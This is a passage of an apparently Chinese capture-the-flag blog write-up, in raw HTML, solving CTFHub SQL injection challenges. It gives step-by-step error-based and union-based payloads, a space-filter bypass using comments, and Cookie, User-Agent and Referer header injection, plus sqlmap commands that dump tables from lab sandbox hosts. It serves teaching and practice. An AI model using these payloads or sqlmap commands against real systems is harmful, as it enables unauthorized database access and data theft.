class="keyword">and</span> (updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(select group_concat(column_name) <span class="keyword">from</span> information_schema.columns where table_name=<span class="string">&#x27;flag&#x27;</span>),<span class="number">0x7e</span>),<span class="number">1</span>));</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20201114210012894.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>爆值</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Payload: ?id=<span class="number">1</span> <span class="keyword">and</span> (updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(select group_concat(flag) <span class="keyword">from</span> flag),<span class="number">0x7e</span>),<span class="number">1</span>));</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20201114205438234.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>好像只有一部分flag，这个时候就用到了<code>mid()</code>函数<br><img src="https://img-blog.csdnimg.cn/20201114213929117.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>使用mid函数来进行字符截取,来显示另外一半flag。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Payload: ?id=<span class="number">1</span> <span class="keyword">and</span> (updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,mid((select group_concat(flag) <span class="keyword">from</span> flag),<span class="number">32</span>),<span class="number">0x7e</span>),<span class="number">1</span>));</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20201114205554257.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="MySQL结构"><a href="#MySQL结构" class="headerlink" title="MySQL结构"></a>MySQL结构</h2><p><img src="https://img-blog.csdnimg.cn/20210127170719344.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>1.判断注入类型<br>输入1，有回显；输入1 and 1=1，正常回显；输入1 and 1=2,  返回错误。<br><img src="https://img-blog.csdnimg.cn/2021012717113182.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>所以是数字型注入<br>2.判断回显点位<br>输入<code>1 order by 2</code>有回显<br><img src="https://img-blog.csdnimg.cn/20210127171405960.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>输入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span></span><br></pre></td></tr></table></figure><p>回显点位为1,2<br><img src="https://img-blog.csdnimg.cn/20210127171713726.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>3.查数据库名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> database(),<span class="number">2</span></span><br></pre></td></tr></table></figure><p>数据库名为sqli<br><img src="https://img-blog.csdnimg.cn/20210127171630811.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>4.查表</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> group_concat(table_name),<span class="number">2</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;sqli&#x27;</span></span><br></pre></td></tr></table></figure><p>有news和nrjduumafr表<br><img src="https://img-blog.csdnimg.cn/2021012717191096.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>5.查字段名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> group_concat(column_name),<span class="number">2</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;nrjduumafr&#x27;</span></span><br></pre></td></tr></table></figure><p>字段名为qejxezuixk<br><img src="https://img-blog.csdnimg.cn/20210127172046307.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>6.爆值</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> qejxezuixk,<span class="number">2</span> <span class="keyword">from</span> nrjduumafr</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210127172202287.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h2><p>输入1，回显ctfhub；输入2，回显skill；输入3，无回显。<br><img src="https://img-blog.csdnimg.cn/20210127121828345.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>绕过空格过滤的方式： <code>/**/、()、%0a</code>。</p><p>用%0a代替空格输入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="comment">/**/</span><span class="keyword">order</span><span class="comment">/**/</span><span class="keyword">by</span><span class="comment">/**/</span><span class="number">2</span></span><br></pre></td></tr></table></figure><p>有回显<br><img src="https://img-blog.csdnimg.cn/20210127122947660.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>判断回显位</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Payload: ?id<span class="operator">=</span><span class="number">-1</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210127124529352.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>查数据库：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Payload: ?id<span class="operator">=</span><span class="number">-1</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span>database(),<span class="number">2</span> </span><br></pre></td></tr></table></figure><p> 数据库为sqli<img src="https://img-blog.csdnimg.cn/20210127125025284.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>查表 ：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Payload: ?id<span class="operator">=</span> <span class="number">-1</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span>group_concat(table_name),<span class="number">2</span><span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>information_schema.tables<span class="comment">/**/</span><span class="keyword">where</span><span class="comment">/**/</span>table_schema<span class="operator">=</span><span class="string">&#x27;sqli&#x27;</span> </span><br></pre></td></tr></table></figure><p>sqli中有两个表，分别为 rrkdctjwlf和news<br><img src="https://img-blog.csdnimg.cn/20210127125119950.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>查字段：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Payload: ?id<span class="operator">=</span><span class="number">-1</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span>group_concat(column_name),<span class="number">2</span><span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>information_schema.columns<span class="comment">/**/</span><span class="keyword">where</span><span class="comment">/**/</span>table_name<span class="operator">=</span><span class="string">&#x27;rrkdctjwlf&#x27;</span></span><br></pre></td></tr></table></figure><p>rrkdctjwlf表中，有一个字段wonevkchnv<br><img src="https://img-blog.csdnimg.cn/20210127125346665.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>查看字段的数据：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Payload: ?id<span class="operator">=</span> <span class="number">-1</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span>wonevkchnv,<span class="number">2</span><span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>rrkdctjwlf</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/2021012712590372.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="Cookie注入"><a href="#Cookie注入" class="headerlink" title="Cookie注入"></a>Cookie注入</h2><p><img src="https://img-blog.csdnimg.cn/20210127144717532.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>burpsuite抓包，可以看到Cookie里面有id参数<br><img src="https://img-blog.csdnimg.cn/20210127144902149.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>1.判断注入类型<br><code>id=1 and 1=1</code>有回显<br><img src="https://img-blog.csdnimg.cn/20210127145409657.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><code>id=1 and 1=2</code>无回显<br><img src="https://img-blog.csdnimg.cn/20210127145335993.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>所以是数字型注入</p><p>2.判断字段数<br>当<code>id=1 order by 2</code> 时回显正常，当<code>id=1 order by 3</code>时无回显，所以字段数为2<br><img src="https://img-blog.csdnimg.cn/20210127145658543.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>3.爆数据库名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,database()</span><br></pre></td></tr></table></figure><p>当前数据库名为sqli<br><img src="https://img-blog.csdnimg.cn/20210127145752840.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>4.爆表名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;sqli&#x27;</span></span><br></pre></td></tr></table></figure><p>有两个表，usrnjffgta和news<br><img src="https://img-blog.csdnimg.cn/20210127145910479.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>5.爆字段名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;sqli&#x27;</span> <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;usrnjffgta&#x27;</span></span><br></pre></td></tr></table></figure><p>字段名为wbloxpuwcu<br><img src="https://img-blog.csdnimg.cn/20210127150117665.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>6.爆值</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(wbloxpuwcu) <span class="keyword">from</span> usrnjffgta</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210127150238553.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>sqlmap–Cookie注入</strong></p><blockquote><p>在sqlmap中使用cookie注入，level &gt;=2才行</p></blockquote><p>首先检测是否有cookie注入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>u &quot;http://challenge-141d20bd8f71c3ca.sandbox.ctfhub.com:10080&quot; <span class="comment">--cookie &quot;id=1&quot; --level 2  </span></span><br></pre></td></tr></table></figure><p>存在Cookie注入<br><img src="https://img-blog.csdnimg.cn/20210127151950563.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>使用kali里面的sqlmap工具<br>1.查库</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>u &quot;http://challenge-141d20bd8f71c3ca.sandbox.ctfhub.com:10080&quot; <span class="comment">--cookie &quot;id=1&quot; --level 2 --dbs   </span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210127150746902.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>2.查表</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>u &quot;http://challenge-141d20bd8f71c3ca.sandbox.ctfhub.com:10080&quot; <span class="comment">--cookie &quot;id=1&quot; -D sqli --tables</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/2021012715085841.png" alt="在这里插入图片描述"><br>3.查字段</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>u &quot;http://challenge-141d20bd8f71c3ca.sandbox.ctfhub.com:10080&quot; <span class="comment">--cookie &quot;id=1&quot; --level 2 -D sqli -T usrnjffgta --columns</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210127151427189.png" alt="在这里插入图片描述"><br>4.爆值</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>u &quot;http://challenge-141d20bd8f71c3ca.sandbox.ctfhub.com:10080&quot; <span class="comment">--cookie &quot;id=1&quot; --level 2 -D sqli -T usrnjffgta -C wbloxpuwcu --dump</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210127151344509.png" alt="在这里插入图片描述"></p><h2 id="UA注入"><a href="#UA注入" class="headerlink" title="UA注入"></a>UA注入</h2><p><img src="https://img-blog.csdnimg.cn/20210127152415405.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>提示输入点在User-Agent，使用bp抓包<br><img src="https://img-blog.csdnimg.cn/20210127152708187.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>1.判断注入类型<br>输入1，有回显；输入1 and 1=1，正常回显；输入1 and 1=2,  返回错误。<br><img src="https://img-blog.csdnimg.cn/20210127152937575.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>注入类型为数字型注入</p><p>2.判断字段数<br>当<code>1 order by 2</code> 时，回显正常，当<code>1 order by 3</code>时，无回显，所以字段数为2<br><img src="https://img-blog.csdnimg.cn/20210127153140753.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>3.爆数据库名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,database()</span><br></pre></td></tr></table></figure><p>当前数据库名为sqli<br><img src="https://img-blog.csdnimg.cn/20210127153316846.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>4.爆表名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;sqli&#x27;</span></span><br></pre></td></tr></table></figure><p>有两个表， news,llvyiyrndd<br><img src="https://img-blog.csdnimg.cn/20210127153357173.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>5.爆字段名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;sqli&#x27;</span> <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;llvyiyrndd&#x27;</span></span><br></pre></td></tr></table></figure><p>字段名为mgrbaiuvpa<br><img src="https://img-blog.csdnimg.cn/20210127153448891.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>6.爆值</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(mgrbaiuvpa) <span class="keyword">from</span> llvyiyrndd</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210127153551534.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>sqlmap–UA注入</strong></p><blockquote><p>在sqlmap中lever&gt;=3才会去检查user-agent头是否存在注入漏洞</p></blockquote><p>首先检测是否有UA注入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>u &quot;http://challenge-532573947dea4d7b.sandbox.ctfhub.com:10080&quot; <span class="comment">--user-agent &quot;id=1&quot; --level 3</span></span><br><span class="line"></span><br><span class="line">sqlmap <span class="operator">-</span>u &quot;http://challenge-ee766d810401f708.sandbox.ctfhub.com:10080&quot; <span class="comment">--user-agent &quot;id=1&quot; --level 3</span></span><br></pre></td></tr></table></figure><p>user-agent处存在注入<br><img src="https://img-blog.csdnimg.cn/20210127160432116.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>1.爆数据库</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>u &quot;http://challenge-ee766d810401f708.sandbox.ctfhub.com:10080&quot; <span class="comment">--user-agent &quot;id=1&quot; --level 3  --dbs</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210127154207704.png" alt="在这里插入图片描述"><br>2.爆表</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>u &quot;http://challenge-ee766d810401f708.sandbox.ctfhub.com:10080&quot; <span class="comment">--user-agent &quot;id=1&quot; --level 3 -D sqli --tables</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210127154647309.png" alt="在这里插入图片描述"><br>3.爆字段</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>u &quot;http://challenge-ee766d810401f708.sandbox.ctfhub.com:10080&quot; <span class="comment">--user-agent &quot;id=1&quot; --level 3 -D sqli -T llvyiyrndd --columns</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210127155148329.png" alt="在这里插入图片描述"><br>4.爆值</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>u &quot;http://challenge-ee766d810401f708.sandbox.ctfhub.com:10080&quot; <span class="comment">--user-agent &quot;id=1&quot; --level 3 -D sqli -T llvyiyrndd -C mgrbaiuvpa --dump</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210127155209659.png" alt="在这里插入图片描述"></p><h2 id="Refer注入"><a href="#Refer注入" class="headerlink" title="Refer注入"></a>Refer注入</h2><p><img src="https://img-blog.csdnimg.cn/20210127161950997.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>提示请在referer输入ID，bp抓包<br><img src="https://img-blog.csdnimg.cn/20210127162149802.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>补充Referer头<br><img src="https://img-blog.csdnimg.cn/20210127162227937.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>1.爆数据库名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,database()</span><br></pre></td></tr></table></figure><p>当前数据库名为sqli<br><img src="https://img-blog.csdnimg.cn/20210127162404134.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>2.爆表名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span 